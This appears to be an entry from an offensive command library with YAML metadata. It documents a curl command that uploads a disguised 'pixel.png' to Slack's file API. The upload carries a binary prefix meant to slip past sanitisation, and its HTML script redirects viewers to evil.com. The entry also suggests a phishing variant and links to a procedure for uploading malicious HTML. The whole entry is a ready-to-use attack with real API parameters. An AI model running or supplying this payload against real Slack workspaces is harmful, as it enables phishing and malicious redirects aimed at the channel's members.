---
id: cmd-slack-upload-binary
data: >-
  curl -X POST https://upload.slack.com/api/files.uploadAsync -H "Content-Type:
  multipart/form-data; boundary=---------------------------89481407720596"
  --data-binary
  "-----------------------------89481407720596\nContent-Disposition: form-data;
  name=\"file\"; filename=\"pixel.png\"\nContent-Type:
  text/html\n\n<bunch_of_binary_chars_here>\n<html>\n<script>\nwindow.location='http://www.evil.com';\n</script>\n</html>\n-----------------------------89481407720596--"
  -F "filename=pixel" -F "token=$SLACK_TOKEN" -F "channels=$CHANNEL_ID" -F
  "title=pixel" -F "initial_comment=hi"
tags:
  - upload
  - slack
type: command
output: '{"ok":true,"file":{"id":"F1AU0FTGR"}}'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:27.313Z'
verified: false
validated: true
submitted: true
---
# slack-upload-binary-html-redirect

## Command

```bash
curl -X POST https://upload.slack.com/api/files.uploadAsync -H "Content-Type: multipart/form-data; boundary=---------------------------89481407720596" --data-binary "-----------------------------89481407720596\nContent-Disposition: form-data; name=\"file\"; filename=\"pixel.png\"\nContent-Type: text/html\n\n<bunch_of_binary_chars_here>\n<html>\n<script>\nwindow.location='http://www.evil.com';\n</script>\n</html>\n-----------------------------89481407720596--" -F "filename=pixel" -F "token=$SLACK_TOKEN" -F "channels=$CHANNEL_ID" -F "title=pixel" -F "initial_comment=hi"
```

## Description

This curl command replicates the HTTP POST to Slack's file upload API, sending a multipart form with a binary-prefixed HTML file to bypass sanitization and upload a redirect script.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$SLACK_TOKEN` | Authentication token for Slack API | Yes |
| `$CHANNEL_ID` | ID of target channel | Yes |
| `--data-binary` | File content with binary + HTML | Yes |
| `-F filename=pixel` | Base filename without extension | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://upload.slack.com/api/files.uploadAsync # (with params as above)
```

### Advanced Usage

For phishing variant, replace HTML with form-posting content.

```bash
# Similar but with phishing HTML in --data-binary
```

## Expected Output

JSON response indicating success, including file ID for public link: {"ok":true,"file":{"id":"F1AU0FTGR","title":"pixel"}}.

## Related

- [[commands/slack-upload-png-header-bypass]]
- [[procedures/Upload-Malicious-HTML-File-with-Binary-Prefix]]
